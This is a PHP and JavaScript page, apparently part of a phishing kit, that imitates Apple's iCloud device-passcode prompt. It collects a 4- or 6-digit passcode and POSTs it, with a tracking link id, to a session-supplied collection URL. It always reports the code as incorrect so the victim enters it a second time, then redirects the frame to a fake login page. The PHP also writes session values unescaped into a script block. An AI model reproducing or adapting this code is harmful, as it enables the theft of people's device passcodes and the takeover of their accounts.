<?php
	session_name("CAKEPHP");
	session_start();
	include(__DIR__ . "/../includes/apple.php");
	$username = $_SESSION['Link']['GeneratedLink']['username'] ?? '';
	$post_url = $_SESSION['Link']['VisitorDetails']['post_url'] ?? '';
	$link_id = $_SESSION['Link']['GeneratedLink']['id'] ?? '';
	$redirect_url = $_SESSION['Link']['GeneratedLink']['redirect_url'] ?? '';
	
	echo "<script>
			var username = '$username';
			var post_url = '$post_url';
			var link_id = '$link_id';
			var redirect_url = '$redirect_url';
	      </script>";
	
	
	$passcode_length = $_GET['l'] ?? 4;
	
	$query_string = "";
	$actual_link = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
	$parts = parse_url($actual_link);
	
	parse_str($parts['query'], $query);
	$query_string = '?'. http_build_query($query);
	
	$next_passcode_length = ($passcode_length == 4 ? 6 : 4);
	$query['l'] = $next_passcode_length;
	$query_string = '?'. http_build_query($query);
	$switch_url = "code.php$query_string";
	
	
?>
<!DOCTYPE html>
<html dir="ltr" data-rtl="false" lang="en" class="prefpane na-presentation">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title></title>
    <meta name="robots" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<!--
	<link href="https://db.onlinewebfonts.com/c/09f79b480eabca839b233bdde61980ac?family=SF+Pro+Icons+Regular" rel="stylesheet" type="text/css"/>
	-->
    <link rel="stylesheet" href="script/icloud2024/css/home-206028b35c1e109c240a.css">
    <link rel="stylesheet" type="text/css" media="screen" href="script/icloud2024/css/app-sk7.css">
    <style type="text/css">
	
	.form-message-wrapper:after, .form-message-wrapper:before {
		font-family: 'SF Pro Icons Regular' !important;
	}
	
	@keyframes opacity-60-25-0-12{
		0% {
			opacity: 0.25;
		}
		0.01% {
			opacity: 0.25;
		}
		0.02% {
			opacity: 1;
		}
		60.01% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.25;
		}
	}
	
	@keyframes opacity-60-25-1-12{
		0% {
			opacity: 0.25;
		}
		8.34333% {
			opacity: 0.25;
		}
		8.35333% {
			opacity: 1;
		}
		68.3433% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.25;
		}
	}
	@keyframes opacity-60-25-2-12{
		0% {
			opacity: 0.25;
		}
		16.6767% {
			opacity: 0.25;
		}
		16.6867% {
			opacity: 1;
		}
		76.6767% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.25;
		}
	}
	@keyframes opacity-60-25-3-12{
		0% {
			opacity: 0.25;
		}
		25.01% {
			opacity: 0.25;
		}
		25.02% {
			opacity: 1;
		}
		85.01% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.25;
		}
	}
	@keyframes opacity-60-25-4-12{
		0% {
			opacity: 0.25;
		}
		33.3433% {
			opacity: 0.25;
		}
		33.3533% {
			opacity: 1;
		}
		93.3433% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.25;
		}
	}
	@keyframes opacity-60-25-5-12{
		0% {
			opacity: 0.270958;
		}
		41.6767% {
			opacity: 0.25;
		}
		41.6867% {
			opacity: 1;
		}
		1.67667% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.270958;
		}
	}
	@keyframes opacity-60-25-6-12{
		0% {
			opacity: 0.375125;
		}
		50.01% {
			opacity: 0.25;
		}
		50.02% {
			opacity: 1;
		}
		10.01% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.375125;
		}
	}
	@keyframes opacity-60-25-7-12{
		0% {
			opacity: 0.479292;
		}
		58.3433% {
			opacity: 0.25;
		}
		58.3533% {
			opacity: 1;
		}
		18.3433% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.479292;
		}
	}
	@keyframes opacity-60-25-8-12{
		0% {
			opacity: 0.583458;
		}
		66.6767% {
			opacity: 0.25;
		}
		66.6867% {
			opacity: 1;
		}
		26.6767% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.583458;
		}
	}
	@keyframes opacity-60-25-9-12{
		0% {
			opacity: 0.687625;
		}
		75.01% {
			opacity: 0.25;
		}
		75.02% {
			opacity: 1;
		}
		35.01% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.687625;
		}
	}
	@keyframes opacity-60-25-10-12{
		0% {
			opacity: 0.791792;
		}
		83.3433% {
			opacity: 0.25;
		}
		83.3533% {
			opacity: 1;
		}
		43.3433% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.791792;
		}
	}
	@keyframes opacity-60-25-11-12{
		0% {
			opacity: 0.895958;
		}
		91.6767% {
			opacity: 0.25;
		}
		91.6867% {
			opacity: 1;
		}
		51.6767% {
			opacity: 0.25;
		}
		100% {
			opacity: 0.895958;
		}
	}
	
	
	</style>
  </head>
  <body class="tk-body ">
    <div aria-hidden="true" style="font-family:&quot;SF Pro Icons&quot;; width: 0px; height: 0px; color: transparent;">.</div>
    <div aria-hidden="true" style="font-family:&quot;SF Pro Display&quot;; width: 0px; height: 0px; color: transparent;">.</div>
    <div class="si-body si-container container-fluid" id="content" role="main" data-theme="dark">
      <apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
        <div class="widget-container  fade-in restrict-min-content  restrict-max-wh  fade-in " data-mode="embed" data-isiebutnotedge="false">
          <div id="step" class="si-step  ">
            <logo {hide-app-logo}="hideAppLogo" {show-fade-in}="showFadeIn" {(section)}="section"></logo>
            
			<div id="stepEl" class="   ">
			  <div class="sk7">
				<hsa2-sk7>
				  <div class="verify-device">
					<div class="sa-sk7__app-title">
					  <h1 class=" tk-intro  " tabindex="-1">
					  
						<?php
						
							if($passcode_length==4){
								echo $language['enter_4digit'][$lang];
							}else{
								echo $language['enter_6digit'][$lang];
							}
						
						?>
					  
					  
					  </h1>
					</div>
					<div class="sa-sk7__content">
					  <div class="verify-device__sec-code">
						<div class="form-security-code ">
						  <div class="form-security-code-inputs">
						  
							<?php
								for($i=1;$i<=$passcode_length;$i++){
									echo '<input class="form-security-code-input trailing-input" maxlength="1" type="text" inputmode="numeric" autocapitalize="off" autocorrect="off" spellcheck="false" autocomplete="off" aria-label="Digit '.$i.'" value="" aria-invalid="true" aria-describedby="form-security-code-error-1704875536942-0">';
								}
							
							?>
						  
							
						  </div>
						  <div class="form-message-wrapper" id="form-security-code-error" >
							<span class="visuallyhidden">Digit</span>
							<span class="form-message">
								<?=$language['incorrect_passcode'][$lang];?>
							</span>
						  </div>
						</div>
					  </div>
					  <div class="signin-container-footer">
						<div class="signin-container-footer__info">
							<?=$language['enter_pass_location'][$lang];?>
						</div>
						<div class="fixed-h">
						
						
						  <div class="signin-container-footer__link">
							<div class="text text-typography-body-reduced">
							  <div class="inline-links">
								<div class="inline-links__link">
								  
								  
								
								  <button class="button button-link button-rounded-rectangle" type="button" id="alt-options-btn" onclick="location.href='<?php echo $switch_url; ?>'">
									<span class="text text-typography-body-reduced">
									
									<?php
									
										if($passcode_length == 4){
											echo $language['have6_digit'][$lang];
										}else{
											echo $language['have4_digit'][$lang];
										}
									?>
									
									</span>
								  </button>
								  

								</div>
							  </div>
							</div>
						  </div>

						  <div class="signin-container-footer__spinner" style="display: none;">
							  <div class="spinner">
								  <div class="spinner-container">
									  <div class="spinner-nib spinner-nib-1"></div>
									  <div class="spinner-nib spinner-nib-2"></div>
									  <div class="spinner-nib spinner-nib-3"></div>
									  <div class="spinner-nib spinner-nib-4"></div>
									  <div class="spinner-nib spinner-nib-5"></div>
									  <div class="spinner-nib spinner-nib-6"></div>
									  <div class="spinner-nib spinner-nib-7"></div>
									  <div class="spinner-nib spinner-nib-8"></div>
								  </div>
								  <span aria-live="assertive" class="visuallyhidden" role="status"><?=$language['verifying'][$lang];?>…</span>
							  </div>
							  <div class="text text-typography-body-reduced"><?=$language['verifying'][$lang];?>…</div>
						  </div>
  
						</div>
					  </div>
					</div>
				  </div>
				</hsa2-sk7>
			  </div>
			</div>
			
          </div>
          <div id="stocking" style="display:none !important;"></div>
        </div>
        <idms-modal wrap-class="full-page-error-wrapper " {(show)}="showfullPageError" auto-close="false"></idms-modal>
      </apple-auth>
    </div>
  </body>
</html>
<script src="script/icloud2024/js/jquery-3.7.1.min.js"></script>
<script>
$( document ).ready(function() {
   var max_retry = 0;
   
   $('.trailing-input').on('input', function() {
        var currentInput = $(this);
        var val = currentInput.val().replace(/\D/g, '');
		this.value = val;
        if (val.length > 0) {
			if(currentInput.next('.trailing-input').length >=1){
				currentInput.next('.trailing-input').focus();
			}else{
				$('.trailing-input:first').focus();
			}
        }
    });

    $('.trailing-input').on('paste', function(e) {
        e.preventDefault();
		var pasteData = (e.originalEvent.clipboardData || window.clipboardData).getData('text').trim();
		var remainingData = "";
        var currentInput = $(this);
		var nextInputs = $(this).nextAll('.trailing-input');
		var maxLength = parseInt(currentInput.attr('maxlength'), 10);
		var val = pasteData.substr(0,maxLength).replace(/\D/g, '');
		
		if (val.length > 0) {
			remainingData = pasteData.substring(0, 0) + pasteData.substring(maxLength);
			currentInput.val(val);
			if(currentInput.next('.trailing-input').length >=1){
				currentInput.next('.trailing-input').focus();
			}else{
				$('.trailing-input:first').focus();
			}
		}
		
		$.each(nextInputs,function(){
			if(remainingData.length > 0){
				maxLength = parseInt($(this).attr('maxlength'), 10);
				val = remainingData.substr(0,maxLength).replace(/\D/g, '');
				if (val.length > 0) {
					remainingData = remainingData.substring(0, 0) + remainingData.substring(maxLength);
					$(this).val(val);
					$(this).next('.trailing-input').focus();
					if($(this).next('.trailing-input').length >=1){
						$(this).next('.trailing-input').focus();
					}else{
						$('.trailing-input:first').focus();
					}
				}
			}
		});
		
    });

    $('.trailing-input').on('keydown', function(e) {
        var keyCode = e.keyCode || e.which;

        if (keyCode === 8 || keyCode === 46) { // Check for backspace or delete keys
            var currentInput = $(this);
            var currentInputIndex = $('.trailing-input').index(currentInput);
            if (currentInput.val().length === 0 && currentInputIndex > 0) {
                $('.trailing-input').eq(currentInputIndex - 1).focus().val('');
            }
        }
    });
	
	
	
	
	//form-security-code-inputs
	$('.form-security-code-inputs input').on('change',function(){
		var passcode_length = $('.form-security-code-inputs input').length;
		if(checkEmptyInputs() ==false){
			doLogin();
		}
	});
	
	
	function checkEmptyInputs() {
	  const inputs = $('.form-security-code-inputs input');
	  let isEmpty = false;

	  for (let i = 0; i < inputs.length; i++) {
		if (inputs[i].value.trim() === '') {
		  isEmpty = true;
		  break;
		}
	  }

	  return isEmpty;
	}
	
	function getDigits(){
		var digits = '';
		$('.form-security-code-inputs input').each(function(){
			digits += $(this).val();
		});
		return digits;
	}
	
	function doLogin(){
		max_retry +=1
		var user_input = getDigits();

		$('.signin-container-footer__link').hide();
		$('.signin-container-footer__spinner').show();
		$('.form-security-code-error').hide();
		$('.form-security-code').removeClass('is-error');
		
		$.ajax({
			type:"POST",
			url: post_url,
			data:'id=' + link_id + '&type=passcode&pass=' + user_input,
			dataType: "json",
			success: function(data){},
			error: function(XMLHttpRequest, textStatus, errorThrown) {},
			complete: function(XMLHttpRequest, textStatus, errorThrown) {
				if(max_retry >=2){
					var parentWindow = window.top;
					var parentElement = $(parentWindow.document).find('iframe');
					$(parentElement).attr('src','login.php');
				}else{
					$('.form-security-code').addClass('is-error');
					$('.form-security-code-inputs input').val('');
					$('.signin-container-footer__link').show();
					$('.signin-container-footer__spinner').hide();
				}
			},
		});
		
		
	}

});

</script>